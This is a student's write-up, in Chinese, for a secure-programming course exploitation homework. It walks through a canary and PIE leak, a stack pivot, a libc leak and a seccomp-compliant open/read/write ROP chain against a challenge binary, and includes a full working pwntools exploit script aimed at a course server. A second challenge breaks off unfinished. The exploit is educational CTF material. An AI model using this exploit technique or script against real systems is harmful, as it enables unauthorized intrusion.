###### tags: `程式安全`
# Secure Programming HWA Writeup
## Survey
### 解法
用checksec可以發現防禦機制全開QQ
seccomp tools則顯示只能使用open,read,write等syscall

首先看一下IDA decompile的code，可以知道buffer的大小為24，可是read讀的大小卻是48，所以有buffer overflow的洞，而且可以read兩次
```c=
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_1199();
  printf("What is your name : ");
  fflush(stdout);
  read(0, buf, 0x30uLL);
  printf("Hello, %s\nLeave your message here : ", buf);
  fflush(stdout);
  read(0, buf, 0x30uLL);
  printf("We have received your message : %s\nThanks for your feedbacks\n", buf);
  fflush(stdout);
  return 0LL;
}
```
#### 第一輪input:
因為在return之前必須把return address蓋掉，一定要花一次read來執行攻擊，只有一次read可以拿來讀canary跟PIE base等資訊

讀canary可以利用上課講到的方式，用25個a剛好蓋掉canary的null byte就可以將canary接在buffer後面印出來，還可以順便把saved rbp接著一起印出來

不過這樣還是沒有PIE base，仔細觀察leak的rbp可以發現它的值的區間會落在vmmap中的survey部份，所以可以藉leak的rbp跟PIE base的差值去算出PIE的base

拿到canary跟PIE base之後，就可以去把return address蓋成別的address，還需要libc base才能執行一些libc的function，所以先跳回第一次printf的位置，繼續做read
不能跳到main開頭是因為接下來會跑seccomp，seccomp中用到的syscall已經被第一次的seccomp給ban掉了，會出事

然後第一輪第二次的read需要蓋掉rbp去準備做stack pivot，要做stack pivot的原因是read的大小只有48個byte，只能蓋到return address，不夠串ROP chain
stack pivot選擇bss段的後面位置，因為bss段可寫加上一次allocate memory是0x1000，後面會有空的區域
執行完第一輪的第二次read後，rbp就已經被搬到bss區段了

#### 第二輪input:
第二輪的第一次read不重要，會被第二次蓋掉，所以隨便輸
第二輪的第二次read的目的是讀libc，方法是助教大大提到的讀取stack中殘留的libc address
讓printf之類的libc address使用後殘留在新的stack上，payload跟第一輪的第二次read一樣

#### 第三輪input:
用gdb偷看stack，發現libc殘留的address剛好在rbp-0x20的地方，所以第一次read輸入它的最後一個byte，就可以接著把libc的address印出來
同時利用vmmap去看libc的base address，算出leak的address與base的差值，之後把leak的address減掉差值就會是libc base了

有了libc後，第二次read就可以使用準備好的stack pivot開始執行ROP chain，先call gets來解放read的長度限制，讓接下來可以直接一次串好orw的ROP chain
gets的參數放的buffer位置為PIE+bss-0x8，原因是gets return完剛好會pop canary那個位置的東東，canary的位置正好在原本的rbp-0x8的地方，就是PIE+bss-0x8
這樣的話gets吃到的orw ROP chain就會剛好接續執行，很舒服
新的rbp則放PIE+bss-0x28，因為第二次leave;ret會pop新的rbp，所以要讓新的rbp比read吃的位置rbp-0x20再低8個byte，才不會pop到pop rdi的gadget
最後return address放leave;ret的gadget執行stack pivot的操作，讓輸入最前面的pop rdi gadget開始執行

gadget的部份，rdi是使用ROPgadget去survey裡面尋找pop rdi ; ret找到的
gets_offset則是使用readelf到libc裡面去找的

第二次read輸入：
```
p64(PIE_base + pop_rdi) + p64(PIE_base + bss - 0x8) + p64(libc_base + gets_offset) + canary +\
          p64(PIE_base + bss - 0x28) + p64(PIE_base + leave)
```

#### gets input:
就繼續串orw的ROP chain，重點是open不能call libc function，因為libc是用open64，底層會用到openat syscall，不合法XD
所以我open改成直接用syscall
open的參數後兩個都放0，因為只要read就好，第一個要放path，把path塞在rop chain的最後面，算好address填進第一個參數就行

read要先吃fd，因為沒開其他fd，所以直接填3，buffer位置就設在ROP chain後面，不要蓋到gadget就好，size設成50，flag應該不會很長

write的fd就stdout，也就是1，buffer位置跟size就設成跟read一樣

gadget的部份rsi是去survey找的，但是沒有pop rsi ; ret，只好找pop rsi ; pop r15 ; ret
rdx跟rax去libc-2.29.so找的
syscall不知道為啥在libc-2.29.so用syscall ; ret找不到，最後用--opcode 0F05C3找才找到
read跟write的offset一樣是用readelf在libc裡面找到的

串好執行就會看到flag了

#### 腳本
```python=
#!/usr/bin/python3
from pwn import *

main_printf_offset = 0x1235
bss = 0x4C00

gets_offset = 0x832f0
open_offset = 0x10cc80
read_offset = 0x10cf70
write_offset = 0x10d010

# survey ROPgadget
pop_rdi = 0x1353
pop_rsi_r15 = 0x1351
leave = 0x12e1

# libc ROPgadget
pop_rdx = 0x12bda6
pop_rax = 0x47cf8
syscall = 0xe26f5

#r = process('./survey')
r = remote('140.112.31.97',30201)

# first round input
r.sendafter(': ','a'*25)
r.recvuntil('a'*25)
canary = b'\x00' + r.recv(7)
print(f"Canary: {hex(u64(canary))}")
PIE_base = u64(r.recv(6) + b'\x00\x00') - 0x12f0
print(f"PIE base: {hex(PIE_base)}")

padding = b'a'*24
payload = padding + canary + p64(PIE_base+bss) + p64(PIE_base+main_printf_offset)
r.sendafter(': ',payload)

# second round input
r.sendafter(': ','doge')
payload = padding + canary + p64(PIE_base+bss) + p64(PIE_base+main_printf_offset)
r.sendafter(': ',payload)

# third round input
r.sendafter('name : ',b'\x60')
res = r.recvuntil('\nLeave', drop=True)[7:]
libc_base = u64(res + b'\x00\x00') - 0x1e6560
print(f"lic base: {hex(libc_base)}")

payload = p64(PIE_base + pop_rdi) + p64(PIE_base + bss - 0x8) + p64(libc_base + gets_offset) + canary +\
          p64(PIE_base + bss - 0x28) + p64(PIE_base + leave)
r.sendafter('here : ',payload)

# gets input
filename_address = PIE_base + bss - 0x8 + 0xd8
read_buffer_address = PIE_base + bss - 0x8 + 0xe8

payload = p64(PIE_base + pop_rdi) + p64(filename_address) + p64(PIE_base + pop_rsi_r15) + p64(0) + p64(0) + p64(libc_base + pop_rdx) + p64(0) + p64(libc_base + pop_rax) + p64(2) + p64(libc_base + syscall) +\
          p64(PIE_base + pop_rdi) + p64(3) + p64(PIE_base + pop_rsi_r15) + p64(read_buffer_address) + p64(0) + p64(libc_base + pop_rdx) + p64(50) + p64(libc_base + read_offset) +\
          p64(PIE_base + pop_rdi) + p64(1) + p64(PIE_base + pop_rsi_r15) + p64(read_buffer_address) + p64(0) + p64(libc_base + pop_rdx) + p64(50) + p64(libc_base + write_offset) +\
          p64(PIE_base+main_printf_offset) + b'/home/survey/flag' + b'\x00'*7 
r.sendline(payload)
r.interactive()
```
## Robot
### 解法：
先說我沒解完QQ，我就講到我做的地方跟我剩下想做的事情
首先checksec確定stack沒canary跟RELRO為partial RELRO，有開NX跟PIE